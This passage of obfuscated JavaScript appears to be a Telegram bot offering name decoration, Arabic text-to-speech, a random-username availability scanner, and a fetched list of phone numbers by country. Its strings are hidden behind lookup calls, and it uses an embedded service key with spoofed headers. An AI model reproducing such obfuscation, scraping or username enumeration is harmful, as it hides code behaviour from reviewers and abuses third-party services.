    _0x5ad7f5[_0x48b9a1(0xaef)](_0x193e0c[_0x48b9a1(0x51d)], _0x3b2b11), _0x5ad7f5[_0x48b9a1(0xaef)](_0x193e0c[_0x48b9a1(0x700)], '');
    try {
        const _0x484610 = await axios[_0x48b9a1(0xb22)](_0x1c8be6, _0x5ad7f5, { 'headers': _0x126306 });
        if (_0x193e0c[_0x48b9a1(0xb12)](_0x484610[_0x48b9a1(0x1b1)], 0x4 * -0x24f + 0x58f + 0x1 * 0x475)) {
            const _0x565733 = cheerio[_0x48b9a1(0x8f7)](_0x484610[_0x48b9a1(0xc57)]), _0x5ec8ac = _0x193e0c[_0x48b9a1(0x338)](_0x565733, _0x193e0c[_0x48b9a1(0x887)]), _0x45e81f = [];
            return _0x5ec8ac[_0x48b9a1(0xb61)]((_0x48f9bc, _0x23b1f4) => {
                const _0x33c97a = _0x48b9a1;
                _0x45e81f[_0x33c97a(0x39e)](_0x193e0c[_0x33c97a(0x195)](_0x565733, _0x23b1f4)[_0x33c97a(0x8e5)]());
            }), _0x45e81f;
        } else
            return null;
    } catch (_0x331562) {
        return console[_0x48b9a1(0x7b5)](_0x331562), null;
    }
}
bot[_0x298049(0x65c)](/\/stظصakعصمrt/, _0xf4c2f1 => {
    const _0x33620b = _0x298049, _0x55ba7a = {
            'fxoFO': _0x33620b(0xc70) + _0x33620b(0xc94),
            'QZzpF': _0x33620b(0xa8a),
            'wfTOd': _0x33620b(0x5b2) + _0x33620b(0x27d) + _0x33620b(0x92d) + _0x33620b(0x212)
        }, _0x446efd = _0xf4c2f1[_0x33620b(0x556)]['id'], _0xa678b8 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x55ba7a[_0x33620b(0xc92)],
                            'callback_data': _0x55ba7a[_0x33620b(0x840)]
                        }]]
            }
        };
    bot[_0x33620b(0xb04) + 'e'](_0x446efd, _0x55ba7a[_0x33620b(0xbc1)], _0xa678b8);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x2121c5 => {
    const _0x5cf8cb = _0x298049, _0x362306 = {
            'MoUiR': function (_0x4eaa0a, _0x578710) {
                return _0x4eaa0a === _0x578710;
            },
            'nVuOC': _0x5cf8cb(0xa8a),
            'WhYAw': _0x5cf8cb(0x30b) + _0x5cf8cb(0xd01) + _0x5cf8cb(0x662)
        }, _0x215b3b = _0x2121c5[_0x5cf8cb(0x33c)], _0x5824bf = _0x215b3b[_0x5cf8cb(0x556)]['id'];
    _0x362306[_0x5cf8cb(0xc00)](_0x2121c5[_0x5cf8cb(0xc57)], _0x362306[_0x5cf8cb(0x370)]) && (userStates[_0x5824bf] = { 'awaitingName': !![] }, bot[_0x5cf8cb(0xb04) + 'e'](_0x5824bf, _0x362306[_0x5cf8cb(0x761)]));
}), bot['on'](_0x298049(0x33c), async _0x37071f => {
    const _0x4b73cf = _0x298049, _0x29171b = {
            'kHKaU': function (_0x14bc71, _0x374444) {
                return _0x14bc71(_0x374444);
            },
            'oXzyg': _0x4b73cf(0x82b) + _0x4b73cf(0xba2) + _0x4b73cf(0xa68) + _0x4b73cf(0x3d2)
        }, _0x428fc2 = _0x37071f[_0x4b73cf(0x556)]['id'];
    if (userStates[_0x428fc2] && userStates[_0x428fc2][_0x4b73cf(0xcf0) + 'me']) {
        const _0x12268a = _0x37071f[_0x4b73cf(0x8e5)], _0x3b3c67 = await _0x29171b[_0x4b73cf(0x543)](زخرفة_الاسم, _0x12268a);
        _0x3b3c67 ? _0x3b3c67[_0x4b73cf(0x9a0)](_0x3cc35c => {
            const _0x47d973 = _0x4b73cf;
            bot[_0x47d973(0xb04) + 'e'](_0x428fc2, _0x3cc35c);
        }) : bot[_0x4b73cf(0xb04) + 'e'](_0x428fc2, _0x29171b[_0x4b73cf(0xa0c)]), userStates[_0x428fc2][_0x4b73cf(0xcf0) + 'me'] = ![];
    }
});
const userSessions = {};
async function textToSpeech(_0x28f8d5, _0x5df621) {
    const _0x26e61d = _0x298049, _0x230301 = {
            'RCiZU': _0x26e61d(0xaf9) + _0x26e61d(0xa8c) + _0x26e61d(0x710) + _0x26e61d(0xd13) + _0x26e61d(0xb38) + _0x26e61d(0x5ab),
            'hRwtX': _0x26e61d(0xc9c),
            'lOsxr': _0x26e61d(0xc5b),
            'zCypQ': function (_0x44e060, _0x5cacf4) {
                return _0x44e060 === _0x5cacf4;
            },
            'nltfR': _0x26e61d(0xc6a),
            'YprHb': _0x26e61d(0x439),
            'Njlhe': _0x26e61d(0xd0c),
            'gcIaV': _0x26e61d(0x2a7) + _0x26e61d(0x756) + _0x26e61d(0x25b) + _0x26e61d(0x34b),
            'ahkoC': _0x26e61d(0x4bb) + _0x26e61d(0x4f8) + _0x26e61d(0x809),
            'aklnn': _0x26e61d(0xa7f) + _0x26e61d(0xa62) + _0x26e61d(0x4eb) + _0x26e61d(0x9b2) + _0x26e61d(0x777) + _0x26e61d(0x21e) + _0x26e61d(0x942) + _0x26e61d(0x691) + _0x26e61d(0x8c8) + _0x26e61d(0xb7d) + _0x26e61d(0xa4b) + '6',
            'fvDSp': _0x26e61d(0x959) + 'r',
            'zcJZn': _0x26e61d(0x7ae) + _0x26e61d(0xb60) + _0x26e61d(0xbeb) + _0x26e61d(0x375) + _0x26e61d(0x4e9),
            'aBbvY': function (_0x500410, _0x36d83c) {
                return _0x500410(_0x36d83c);
            }
        }, _0x5c87e0 = _0x230301[_0x26e61d(0x1ab)], _0x402bfd = {
            'text': _0x28f8d5,
            'lang': 'ar',
            'engine': 'g3',
            'pitch': _0x230301[_0x26e61d(0xbae)],
            'rate': _0x230301[_0x26e61d(0xbae)],
            'volume': '1',
            'key': _0x230301[_0x26e61d(0x88c)],
            'gender': _0x230301[_0x26e61d(0x92c)](_0x5df621, _0x230301[_0x26e61d(0xb2f)]) ? _0x230301[_0x26e61d(0xb2f)] : _0x230301[_0x26e61d(0x480)]
        }, _0x2ac7d8 = {
            'accept': _0x230301[_0x26e61d(0x54f)],
            'accept-language': _0x230301[_0x26e61d(0x1fd)],
            'referer': _0x230301[_0x26e61d(0xce9)],
            'user-agent': _0x230301[_0x26e61d(0x464)]
        };
    try {
        const _0x27aa42 = await axios[_0x26e61d(0x943)](_0x5c87e0, {
            'params': _0x402bfd,
            'headers': _0x2ac7d8,
            'responseType': _0x230301[_0x26e61d(0xb14)]
        });
        return Readable[_0x26e61d(0x9cc)](_0x27aa42[_0x26e61d(0xc57)]);
    } catch (_0x58d77c) {
        return console[_0x26e61d(0x7b5)](_0x230301[_0x26e61d(0x9e4)]), await _0x230301[_0x26e61d(0xcc4)](retryWithEnglish, _0x5df621);
    }
}
async function retryWithEnglish(_0xfe1d1) {
    const _0x7c50e2 = _0x298049, _0x3ddea2 = {
            'CMeit': _0x7c50e2(0x827) + _0x7c50e2(0xbd5) + _0x7c50e2(0xb90) + _0x7c50e2(0x6e2),
            'jzQpV': _0x7c50e2(0xaf9) + _0x7c50e2(0xa8c) + _0x7c50e2(0x710) + _0x7c50e2(0xd13) + _0x7c50e2(0xb38) + _0x7c50e2(0x5ab),
            'BqhwH': _0x7c50e2(0xc9c),
            'hDPbA': _0x7c50e2(0xc5b),
            'toAkk': function (_0x24bb33, _0x50ae7b) {
                return _0x24bb33 === _0x50ae7b;
            },
            'HRkWO': _0x7c50e2(0xc6a),
            'TBRRa': _0x7c50e2(0x439),
            'UeaVF': _0x7c50e2(0xd0c),
            'FWXij': _0x7c50e2(0x918) + _0x7c50e2(0xbbc),
            'NvAVj': _0x7c50e2(0x4bb) + _0x7c50e2(0x4f8) + _0x7c50e2(0x809),
            'SulJC': _0x7c50e2(0xa7f) + _0x7c50e2(0xa62) + _0x7c50e2(0x4eb) + _0x7c50e2(0x9b2) + _0x7c50e2(0x777) + _0x7c50e2(0x21e) + _0x7c50e2(0x942) + _0x7c50e2(0x691) + _0x7c50e2(0x8c8) + _0x7c50e2(0xb7d) + _0x7c50e2(0xa4b) + '6',
            'Erdtj': _0x7c50e2(0x959) + 'r'
        }, _0x5988ff = _0x3ddea2[_0x7c50e2(0x6d1)], _0x4abe70 = _0x3ddea2[_0x7c50e2(0x2b4)], _0x2a4fb3 = {
            'text': _0x5988ff,
            'lang': 'en',
            'engine': 'g3',
            'pitch': _0x3ddea2[_0x7c50e2(0x427)],
            'rate': _0x3ddea2[_0x7c50e2(0x427)],
            'volume': '1',
            'key': _0x3ddea2[_0x7c50e2(0x85e)],
            'gender': _0x3ddea2[_0x7c50e2(0x6d3)](_0xfe1d1, _0x3ddea2[_0x7c50e2(0xd30)]) ? _0x3ddea2[_0x7c50e2(0xd30)] : _0x3ddea2[_0x7c50e2(0xb46)]
        }, _0x5f24ff = {
            'accept': _0x3ddea2[_0x7c50e2(0xb1e)],
            'accept-language': _0x3ddea2[_0x7c50e2(0x5c4)],
            'referer': _0x3ddea2[_0x7c50e2(0x233)],
            'user-agent': _0x3ddea2[_0x7c50e2(0x2cf)]
        };
    try {
        const _0x2ff917 = await axios[_0x7c50e2(0x943)](_0x4abe70, {
            'params': _0x2a4fb3,
            'headers': _0x5f24ff,
            'responseType': _0x3ddea2[_0x7c50e2(0x393)]
        });
        return Readable[_0x7c50e2(0x9cc)](_0x2ff917[_0x7c50e2(0xc57)]);
    } catch (_0x2e2426) {
        return null;
    }
}
bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x1deeb5 => {
    const _0xeb1f7e = _0x298049, _0x11ba11 = {
            'LzDcT': function (_0x4e6267, _0x4c7f97) {
                return _0x4e6267 === _0x4c7f97;
            },
            'VQVdz': _0xeb1f7e(0x568) + 'xt',
            'zuSGo': _0xeb1f7e(0xcce),
            'Kptir': _0xeb1f7e(0x467),
            'yNCfB': _0xeb1f7e(0xa6f),
            'DzvmP': _0xeb1f7e(0xb20) + 'ce',
            'YWTfl': _0xeb1f7e(0x3e8) + _0xeb1f7e(0xb4d),
            'qtzgV': _0xeb1f7e(0xc6a),
            'nNqZJ': _0xeb1f7e(0x439),
            'URWNe': function (_0x3edd05, _0x342864) {
                return _0x3edd05 === _0x342864;
            },
            'QumBM': _0xeb1f7e(0xbdd),
            'uFlfg': _0xeb1f7e(0xb7b)
        }, _0x59b5ba = _0x1deeb5[_0xeb1f7e(0x33c)][_0xeb1f7e(0x556)]['id'];
    if (_0x11ba11[_0xeb1f7e(0xc1e)](_0x1deeb5[_0xeb1f7e(0xc57)], _0x11ba11[_0xeb1f7e(0x3e4)])) {
        userSessions[_0x59b5ba] = {
            'gender': null,
            'text': null
        };
        const _0x386a8a = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x11ba11[_0xeb1f7e(0xd15)],
                            'callback_data': _0x11ba11[_0xeb1f7e(0x199)]
                        }],
                    [{
                            'text': _0x11ba11[_0xeb1f7e(0x7f5)],
                            'callback_data': _0x11ba11[_0xeb1f7e(0x7e9)]
                        }]
                ]
            }
        };
        bot[_0xeb1f7e(0xb04) + 'e'](_0x59b5ba, _0x11ba11[_0xeb1f7e(0xad8)], _0x386a8a);
    } else {
        if (_0x11ba11[_0xeb1f7e(0xc1e)](_0x1deeb5[_0xeb1f7e(0xc57)], _0x11ba11[_0xeb1f7e(0x199)]) || _0x11ba11[_0xeb1f7e(0xc1e)](_0x1deeb5[_0xeb1f7e(0xc57)], _0x11ba11[_0xeb1f7e(0x7e9)])) {
            const _0x7d08d5 = _0x11ba11[_0xeb1f7e(0xc1e)](_0x1deeb5[_0xeb1f7e(0xc57)], _0x11ba11[_0xeb1f7e(0x199)]) ? _0x11ba11[_0xeb1f7e(0xa6c)] : _0x11ba11[_0xeb1f7e(0x3ec)];
            userSessions[_0x59b5ba][_0xeb1f7e(0x90f)] = _0x7d08d5, bot[_0xeb1f7e(0x382) + _0xeb1f7e(0x444) + 'up']({ 'inline_keyboard': [] }, {
                'chat_id': _0x59b5ba,
                'message_id': _0x1deeb5[_0xeb1f7e(0x33c)][_0xeb1f7e(0x42f)]
            }), bot[_0xeb1f7e(0xb04) + 'e'](_0x59b5ba, _0xeb1f7e(0x4d6) + _0xeb1f7e(0x9d4) + _0xeb1f7e(0xbf2) + _0xeb1f7e(0x609) + _0xeb1f7e(0x94b) + (_0x11ba11[_0xeb1f7e(0x3d0)](_0x7d08d5, _0x11ba11[_0xeb1f7e(0xa6c)]) ? _0x11ba11[_0xeb1f7e(0x241)] : _0x11ba11[_0xeb1f7e(0xbe2)]) + '.');
        }
    }
}), bot['on'](_0x298049(0x33c), async _0xd909f5 => {
    const _0x1ca733 = _0x298049, _0x2f0eca = {
            'kwMRv': function (_0x51fb66, _0xdebe31, _0x5c61fe) {
                return _0x51fb66(_0xdebe31, _0x5c61fe);
            },
            'Wzxsj': _0x1ca733(0x422) + _0x1ca733(0xc85) + _0x1ca733(0x462) + _0x1ca733(0x44a)
        }, _0x16da69 = _0xd909f5[_0x1ca733(0x556)]['id'];
    if (userSessions[_0x16da69] && userSessions[_0x16da69][_0x1ca733(0x90f)]) {
        const _0x15c574 = _0xd909f5[_0x1ca733(0x8e5)];
        userSessions[_0x16da69][_0x1ca733(0x8e5)] = _0x15c574;
        const _0xa1d446 = userSessions[_0x16da69][_0x1ca733(0x90f)], _0x267b59 = await _0x2f0eca[_0x1ca733(0x82c)](textToSpeech, _0x15c574, _0xa1d446);
        _0x267b59 ? bot[_0x1ca733(0xab7)](_0x16da69, _0x267b59) : bot[_0x1ca733(0xb04) + 'e'](_0x16da69, _0x2f0eca[_0x1ca733(0x1c4)]), delete userSessions[_0x16da69];
    }
});
let md = 0x3 * 0x59b + 0x26cb + -0x379c, validUsers = -0x1ff9 + -0x13 * -0xd6 + 0x1017 * 0x1, checkedUsers = -0x18d4 + 0x3e4 * -0x3 + -0x490 * -0x8, userList = [];
const abc1 = _0x298049(0x194) + _0x298049(0x53d) + _0x298049(0x581) + _0x298049(0xc24) + _0x298049(0xbf0) + _0x298049(0xa15) + _0x298049(0xa3d) + _0x298049(0x210) + _0x298049(0x56c);
async function startSearch(_0x52683a, _0x1f192f, _0x387799) {
    const _0x528cc0 = _0x298049, _0x3e41a0 = {
            'iBqfs': function (_0x2f15f6, _0x184036) {
                return _0x2f15f6 < _0x184036;
            },
            'UIqLj': function (_0x59596a, _0x4e4e1a) {
                return _0x59596a === _0x4e4e1a;
            },
            'pwALh': _0x528cc0(0xa1f),
            'NJjuy': function (_0x4c7b03, _0x49493b) {
                return _0x4c7b03 * _0x49493b;
            },
            'hhcuG': function (_0x333535, _0x19dc3f) {
                return _0x333535 * _0x19dc3f;
            },
            'VrNAq': function (_0x3d65e4, _0x588435) {
                return _0x3d65e4 * _0x588435;
            },
            'GZIjN': function (_0x47ff41, _0x4b3d43) {
                return _0x47ff41 * _0x4b3d43;
            },
            'UwGby': _0x528cc0(0x6ec),
            'fhVht': function (_0x2d9e9c, _0x54e689) {
                return _0x2d9e9c === _0x54e689;
            },
            'CBxEF': _0x528cc0(0x43e),
            'RpHSR': function (_0x2ed68b, _0x5e5c01) {
                return _0x2ed68b + _0x5e5c01;
            },
            'FISBf': function (_0x2d2527, _0x155ddc) {
                return _0x2d2527 + _0x155ddc;
            },
            'LVyLv': _0x528cc0(0x43f) + 'e',
            'LrCzR': function (_0x43f8eb, _0x9f6d38) {
                return _0x43f8eb * _0x9f6d38;
            },
            'YPFij': function (_0x455212, _0x3b02fb) {
                return _0x455212 === _0x3b02fb;
            },
            'USsqN': _0x528cc0(0x916),
            'mFqiR': function (_0x30df7a, _0x137279) {
                return _0x30df7a * _0x137279;
            },
            'UVGzt': function (_0x4bf6af, _0x19cf57) {
                return _0x4bf6af - _0x19cf57;
            },
            'AsUeN': function (_0xd89601, _0x3221b7, _0x1c06fc, _0x512a1a) {
                return _0xd89601(_0x3221b7, _0x1c06fc, _0x512a1a);
            },
            'YHEZW': _0x528cc0(0x630) + _0x528cc0(0xa6a),
            'xfArG': function (_0x48d4be, _0x414880) {
                return _0x48d4be(_0x414880);
            }
        };
    userList = [];
    for (let _0x1be063 = -0x5 * -0x7d + 0x1b0e + -0x9 * 0x347; _0x3e41a0[_0x528cc0(0x596)](_0x1be063, -0x222d + -0x12a + 0x2361 * 0x1); _0x1be063++) {
        let _0x353481 = '';
        if (_0x3e41a0[_0x528cc0(0x744)](_0x387799, _0x3e41a0[_0x528cc0(0x7b0)])) {
            let _0x48563a = abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0xb88)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))], _0x1e6f32 = abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0x797)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))], _0x556e15 = abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0x9e7)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))], _0x25a7fb = abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0x3c2)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))];
            _0x353481 = _0x1e6f32 + '_' + _0x48563a + _0x556e15;
        } else {
            if (_0x3e41a0[_0x528cc0(0x744)](_0x387799, _0x3e41a0[_0x528cc0(0x35b)]))
                _0x353481 = Array[_0x528cc0(0x9cc)]({ 'length': 0x4 }, () => abc1[Math[_0x528cc0(0xac9)](Math[_0x528cc0(0x916)]() * abc1[_0x528cc0(0x825)])])[_0x528cc0(0xc65)]('');
            else {
                if (_0x3e41a0[_0x528cc0(0xd20)](_0x387799, _0x3e41a0[_0x528cc0(0xd24)]))
                    _0x353481 = _0x3e41a0[_0x528cc0(0x52f)](_0x3e41a0[_0x528cc0(0x251)](Array[_0x528cc0(0x9cc)]({ 'length': 0x3 }, () => abc1[Math[_0x528cc0(0xac9)](Math[_0x528cc0(0x916)]() * abc1[_0x528cc0(0x825)])])[_0x528cc0(0xc65)](''), '_'), abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0x797)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))]);
                else {
                    if (_0x3e41a0[_0x528cc0(0xd20)](_0x387799, _0x3e41a0[_0x528cc0(0x4e7)]))
                        _0x353481 = _0x3e41a0[_0x528cc0(0x52f)](_0x3e41a0[_0x528cc0(0x52f)](Array[_0x528cc0(0x9cc)]({ 'length': 0x2 }, () => abc1[Math[_0x528cc0(0xac9)](Math[_0x528cc0(0x916)]() * abc1[_0x528cc0(0x825)])])[_0x528cc0(0xc65)](''), '_'), abc1[Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0xba0)](Math[_0x528cc0(0x916)](), abc1[_0x528cc0(0x825)]))]);
                    else {
                        if (_0x3e41a0[_0x528cc0(0x3ea)](_0x387799, _0x3e41a0[_0x528cc0(0x41c)])) {
                            let _0x5293a5 = _0x3e41a0[_0x528cc0(0x251)](Math[_0x528cc0(0xac9)](_0x3e41a0[_0x528cc0(0xcd9)](Math[_0x528cc0(0x916)](), _0x3e41a0[_0x528cc0(0x52f)](_0x3e41a0[_0x528cc0(0xc07)](-0x845 * 0x3 + -0x16c7 + 0x12 * 0x2a5, 0x359 * -0x1 + -0x100f * -0x2 + -0x1cc2), 0x257a + -0x1 * 0x1d39 + -0x2 * 0x420))), -0x21d3 + -0x1 * 0x1ec1 + 0x4097);
                            _0x353481 = Array[_0x528cc0(0x9cc)]({ 'length': _0x5293a5 }, () => abc1[Math[_0x528cc0(0xac9)](Math[_0x528cc0(0x916)]() * abc1[_0x528cc0(0x825)])])[_0x528cc0(0xc65)]('');
                        } else
                            _0x353481 = Array[_0x528cc0(0x9cc)]({ 'length': 0x4 }, () => abc1[Math[_0x528cc0(0xac9)](Math[_0x528cc0(0x916)]() * abc1[_0x528cc0(0x825)])])[_0x528cc0(0xc65)]('');
                    }
                }
            }
        }
        try {
            const _0x235e0e = await axios[_0x528cc0(0x943)](_0x528cc0(0x1fe) + _0x528cc0(0x958) + _0x353481);
            checkedUsers++, _0x3e41a0[_0x528cc0(0x278)](updateButtons, _0x52683a, _0x1f192f, _0x353481);
            if (_0x235e0e[_0x528cc0(0xc57)][_0x528cc0(0x948)](_0x3e41a0[_0x528cc0(0x8c3)]))
                validUsers++, bot[_0x528cc0(0xb04) + 'e'](_0x52683a, _0x528cc0(0x404) + _0x528cc0(0xce2) + _0x528cc0(0x6c7) + _0x353481), userList[_0x528cc0(0x39e)](_0x353481);
            else {
            }
            md++;
        } catch (_0x17ce14) {
            console[_0x528cc0(0x7b5)](_0x17ce14);
        }
        await new Promise(_0x2a5e43 => setTimeout(_0x2a5e43, 0xfd5 * -0x1 + -0x43 * 0x86 + 0x36cf));
    }
    _0x3e41a0[_0x528cc0(0x1ea)](showFinalStatistics, _0x52683a);
}
function updateButtons(_0x1e1233, _0x3fa295, _0x5145e0) {
    const _0x365749 = _0x298049, _0x51cb6e = {
            'PvChS': _0x365749(0xa1c),
            'zNfYE': _0x365749(0x1ec),
            'RXovo': _0x365749(0x8ef)
        }, _0x52e0bf = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x365749(0x2b2) + '\x20' + _0x5145e0,
                            'callback_data': _0x51cb6e[_0x365749(0x29a)]
                        }],
                    [{
                            'text': _0x365749(0xa93) + _0x365749(0x4ae) + _0x365749(0x316) + checkedUsers,
                            'callback_data': _0x51cb6e[_0x365749(0x8dc)]
                        }],
                    [{
                            'text': _0x365749(0xa93) + _0x365749(0x582) + _0x365749(0x316) + validUsers,
                            'callback_data': _0x51cb6e[_0x365749(0x69b)]
                        }]
                ]
            }
        };
    bot[_0x365749(0x382) + _0x365749(0x444) + 'up'](_0x52e0bf[_0x365749(0xb54) + 'up'], {
        'chat_id': _0x1e1233,
        'message_id': _0x3fa295
    });
}
function showFinalStatistics(_0x3e84dd) {
    const _0x1a4174 = _0x298049, _0xb3182 = {
            'wgsGT': _0x1a4174(0x1ec),
            'KeJog': _0x1a4174(0x8ef),
            'iypEp': _0x1a4174(0x8bc) + 's',
            'FGays': _0x1a4174(0x71c) + _0x1a4174(0xc91) + _0x1a4174(0xa11) + _0x1a4174(0x93b) + _0x1a4174(0x9b1)
        }, _0x5b5937 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x1a4174(0xa93) + _0x1a4174(0x4ae) + _0x1a4174(0x316) + checkedUsers,
                            'callback_data': _0xb3182[_0x1a4174(0x714)]
                        }],
                    [{
                            'text': _0x1a4174(0xa93) + _0x1a4174(0x582) + _0x1a4174(0x316) + validUsers,
                            'callback_data': _0xb3182[_0x1a4174(0x680)]
                        }],
                    [{
                            'text': _0x1a4174(0xc9a) + _0x1a4174(0x8f4) + md + _0x1a4174(0x471) + validUsers + (_0x1a4174(0x40c) + _0x1a4174(0xc5c)),
                            'callback_data': _0xb3182[_0x1a4174(0x791)]
                        }]
                ]
            }
        };
    bot[_0x1a4174(0xb04) + 'e'](_0x3e84dd, _0xb3182[_0x1a4174(0xa6b)], _0x5b5937);
}
bot[_0x298049(0x65c)](/\/stㄹㅎㅊart/, _0x394a3b => {
    const _0x614765 = _0x298049, _0xd06985 = {
            'qQSSo': _0x614765(0x5d0) + 'ات',
            'VVgaa': _0x614765(0x720) + 'e',
            'VeAWQ': _0x614765(0x5b2) + _0x614765(0x27d) + _0x614765(0x910) + _0x614765(0x2f8) + 'ت.'
        }, _0x1be035 = _0x394a3b[_0x614765(0x556)]['id'], _0x4e2bba = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xd06985[_0x614765(0x49b)],
                            'callback_data': _0xd06985[_0x614765(0x1d3)]
                        }]]
            }
        };
    bot[_0x614765(0xb04) + 'e'](_0x1be035, _0xd06985[_0x614765(0x7d6)], _0x4e2bba);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0xcc4982 => {
    const _0x1dd13a = _0x298049, _0x1e8499 = {
            'YrfKC': function (_0x3b01de, _0x2e4822) {
                return _0x3b01de === _0x2e4822;
            },
            'fWizX': _0x1dd13a(0x720) + 'e',
            'dAbmF': _0x1dd13a(0x8a5) + '1',
            'eJDSE': _0x1dd13a(0xa1f),
            'LYFCX': _0x1dd13a(0x456) + _0x1dd13a(0xb21),
            'XxaWW': _0x1dd13a(0x6ec),
            'JWlhD': _0x1dd13a(0x2ef),
            'oTOnV': _0x1dd13a(0x43e),
            'pbWzy': _0x1dd13a(0x67b),
            'ruxot': _0x1dd13a(0x43f) + 'e',
            'ehVmv': _0x1dd13a(0xa2c),
            'USpdW': _0x1dd13a(0x916),
            'SleDi': _0x1dd13a(0xc9e),
            'cNcYf': _0x1dd13a(0x208),
            'RHweA': _0x1dd13a(0x3e8) + _0x1dd13a(0x973),
            'lbYOa': function (_0x18ee1f, _0x5d70b7, _0x35e392, _0x3c2f67) {
                return _0x18ee1f(_0x5d70b7, _0x35e392, _0x3c2f67);
            }
        }, _0x3e80a1 = _0xcc4982[_0x1dd13a(0x33c)][_0x1dd13a(0x556)]['id'], _0x7dc2f3 = _0xcc4982[_0x1dd13a(0x33c)][_0x1dd13a(0x42f)];
    if (_0x1e8499[_0x1dd13a(0xa01)](_0xcc4982[_0x1dd13a(0xc57)], _0x1e8499[_0x1dd13a(0xa37)])) {
        const _0x33ff9f = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x1e8499[_0x1dd13a(0xb15)],
                            'callback_data': _0x1e8499[_0x1dd13a(0x74e)]
                        }],
                    [{
                            'text': _0x1e8499[_0x1dd13a(0x266)],
                            'callback_data': _0x1e8499[_0x1dd13a(0x401)]
                        }],
                    [{
                            'text': _0x1e8499[_0x1dd13a(0x784)],
                            'callback_data': _0x1e8499[_0x1dd13a(0x605)]
                        }],
                    [{
                            'text': _0x1e8499[_0x1dd13a(0x9c7)],
                            'callback_data': _0x1e8499[_0x1dd13a(0xa4a)]
                        }],
                    [{
                            'text': _0x1e8499[_0x1dd13a(0x477)],
                            'callback_data': _0x1e8499[_0x1dd13a(0x275)]
                        }],
                    [{
                            'text': _0x1e8499[_0x1dd13a(0xb3e)],
                            'callback_data': _0x1e8499[_0x1dd13a(0xb4f)]
                        }]
                ]
            }
        };
        bot[_0x1dd13a(0x382) + _0x1dd13a(0x220)](_0x1e8499[_0x1dd13a(0x967)], {
            'chat_id': _0x3e80a1,
            'message_id': _0x7dc2f3,
            'reply_markup': _0x33ff9f[_0x1dd13a(0xb54) + 'up']
        });
    } else
        [
            _0x1e8499[_0x1dd13a(0x74e)],
            _0x1e8499[_0x1dd13a(0x401)],
            _0x1e8499[_0x1dd13a(0x605)],
            _0x1e8499[_0x1dd13a(0xa4a)],
            _0x1e8499[_0x1dd13a(0x275)],
            _0x1e8499[_0x1dd13a(0xb4f)]
        ][_0x1dd13a(0x948)](_0xcc4982[_0x1dd13a(0xc57)]) && _0x1e8499[_0x1dd13a(0x688)](startSearch, _0x3e80a1, _0x7dc2f3, _0xcc4982[_0x1dd13a(0xc57)]);
});
const chatSessions = {}, الدول = {
        '+1': [
            _0x298049(0x495),
            _0x298049(0x1d8)
        ],
        '+46': [
            _0x298049(0x247),
            _0x298049(0x297)
        ],
        '+86': [
            _0x298049(0x4de),
            _0x298049(0x749)
        ],
        '+852': [
            _0x298049(0xbfe),
            _0x298049(0x86f)
        ],
        '+45': [
            _0x298049(0x731),
            _0x298049(0x640)
        ],
        '+33': [
            _0x298049(0x617),
            _0x298049(0x7ad)
        ],
        '+31': [
            _0x298049(0xa21),
            _0x298049(0x539)
        ],
        '+7': [
            _0x298049(0x339),
            _0x298049(0xd34)
        ],
        '+7KZ': [
            _0x298049(0xc29),
            _0x298049(0x5f0)
        ],
        '+381': [
            _0x298049(0x2b6),
            _0x298049(0x8c0)
        ],
        '+44': [
            _0x298049(0x38d),
            _0x298049(0xafd)
        ],
        '+371': [
            _0x298049(0x6a1),
            _0x298049(0x8eb)
        ],
        '+62': [
            _0x298049(0x7a9),
            _0x298049(0x653)
        ],
        '+351': [
            _0x298049(0x84f),
            _0x298049(0x755)
        ],
        '+34': [
            _0x298049(0xc69),
            _0x298049(0x50b)
        ],
        '+372': [
            _0x298049(0xd2f),
            _0x298049(0xa0f)
        ],
        '+358': [
            _0x298049(0x5f7),
            _0x298049(0x6e3)
        ],
        '+61': [
            _0x298049(0x99e),
            _0x298049(0x1f1)
        ],
        '+55': [
            _0x298049(0x7dc),
            _0x298049(0xacc)
        ],
        '+229': [
            _0x298049(0x3ba),
            _0x298049(0xca4)
        ],
        '+43': [
            _0x298049(0x673),
            _0x298049(0xb6a)
        ],
        '+54': [
            _0x298049(0xbc8),
            _0x298049(0x18c)
        ],
        '+961': [
            _0x298049(0x669),
            _0x298049(0xad0)
        ],
        '+49': [
            _0x298049(0xa0e),
            _0x298049(0x529)
        ],
        '+994': [
            _0x298049(0x3bf),
            _0x298049(0x866)
        ],
        '+351': [
            _0x298049(0x1f0),
            _0x298049(0x755)
        ],
        '+60': [
            _0x298049(0x366),
            _0x298049(0x6fa)
        ],
        '+63': [
            _0x298049(0x8f6),
            _0x298049(0xa60)
        ]
    };
async function استيراد_الأرقام() {
    const _0x20776a = _0x298049, _0x29d456 = {
            'kxkmi': function (_0x99ad3f, _0x47bbb6) {
                return _0x99ad3f(_0x47bbb6);
            },
            'jtoMQ': _0x20776a(0x54b) + _0x20776a(0x1ba) + _0x20776a(0xa84)
        };
    try {
        const _0x3d13e3 = await _0x29d456[_0x20776a(0x66e)](fetch, _0x29d456[_0x20776a(0x46e)]), _0x109c91 = await _0x3d13e3[_0x20776a(0x8e5)]();
        return _0x109c91[_0x20776a(0xb11)]('\x0a');
    } catch (_0x270b5a) {
        return console[_0x20776a(0x7b5)](_0x20776a(0x846) + _0x20776a(0x7ee) + _0x270b5a), [];
    }
}
